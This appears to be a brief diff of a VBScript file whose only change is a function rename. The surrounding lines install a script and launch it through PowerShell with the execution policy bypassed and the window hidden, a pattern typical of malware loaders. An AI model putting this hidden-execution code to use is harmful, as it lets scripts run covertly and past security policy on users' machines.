@@ -24,7 +24,7 @@ Install(scriptShell)
 execute(scriptShell)
 End If
 
-Function execute(path)
+Function Execute(path)
 Set objShell = CreateObject("Wscript.shell")
 objShell.run("powershell -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file " + scriptShell)
 End Function
